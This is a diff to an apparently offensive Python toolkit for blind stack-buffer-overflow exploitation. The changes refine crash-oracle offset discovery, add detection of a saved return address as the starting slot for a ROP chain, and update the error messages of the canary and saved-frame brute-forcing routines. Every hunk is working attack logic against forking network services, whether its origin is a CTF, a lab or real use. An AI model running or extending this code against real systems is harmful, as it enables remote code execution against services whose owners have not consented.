@@ -194,7 +194,12 @@ def find_overflow_offset(survives, *, lo: int = 8, hi: int = 512):
     """The smallest overflow length that crashes the child -- the distance to the first saved
     pointer (saved rbp, just below the return address). b"A"*L survives while L stays within the
     buffer and crashes once it clobbers that pointer."""
-    for L in range(lo, hi):
+    # The baseline must SURVIVE: if even `lo` bytes "crash", the oracle never answered (wrong
+    # survive token, server not replying) and `lo - 1` would be a fabricated offset that sends the
+    # canary/frame/byte-read steps off to burn hundreds of connections on a wrong slot.
+    if not survives(b"A" * lo):
+        return None
+    for L in range(lo + 1, hi):
         if not survives(b"A" * L):
             return L - 1
     return None
@@ -230,6 +235,18 @@ def _image_pointer(known: bytes):
         v = int.from_bytes(known[i:i + 8], "little")
         if _IMG_LO <= v < _IMG_HI:
             return v
+    return None
+
+
+def image_pointer_slot(known: bytes):
+    """(value, index) of the first WORD-ALIGNED 8-byte window in `known` that looks like a
+    main-image code pointer -- the saved return address -- or None. The index is where that word
+    sits above the read's start, i.e. where a chain must begin: 8 behind a saved rbp, but 0 when
+    the function has no frame pointer (-O2) or the caller's offset already points at the return."""
+    for i in range(0, max(0, len(known) - 7), 8):
+        v = int.from_bytes(known[i:i + 8], "little")
+        if _IMG_LO <= v < _IMG_HI:
+            return v, i
     return None
 
 
@@ -347,8 +364,9 @@ def brute_canary(survives, *, offset=None, lo: int = 8, hi: int = 512) -> dict:
         offset = find_overflow_offset(survives, lo=lo, hi=hi)
     if offset is None:
         return {"ok": False, "canary": None, "offset": None, "first_byte_nul": False,
-                "reason": f"no overflow length between {lo} and {hi} crashed the child, so there "
-                          "is no crash-vs-survived oracle to brute with"}
+                "reason": f"no overflow length between {lo} and {hi} crashed the child (or even "
+                          f"a {lo}-byte input did not survive -- the server never gave the survive "
+                          "response), so there is no crash-vs-survived oracle to brute with"}
     got = read_saved_bytes(survives, offset, 8)
     nul = got[:1] == _CANARY_NUL
     if len(got) < 8:
@@ -403,7 +421,8 @@ def brute_frame(survives, *, offset=None, words: int = 3, lo: int = 8, hi: int =
         offset = find_overflow_offset(survives, lo=lo, hi=hi)
     if offset is None:
         return {"ok": False, "canary": None, "canary_offset": None, "ret_offset": None,
-                "reason": f"no overflow length between {lo} and {hi} crashed the child"}
+                "reason": f"no overflow length between {lo} and {hi} crashed the child (or even "
+                          f"a {lo}-byte input did not survive: no working survive oracle)"}
     got = read_saved_bytes(survives, offset, 8 * max(2, words))
     if len(got) < 16:
         return {"ok": False, "canary": None, "canary_offset": offset, "ret_offset": None,
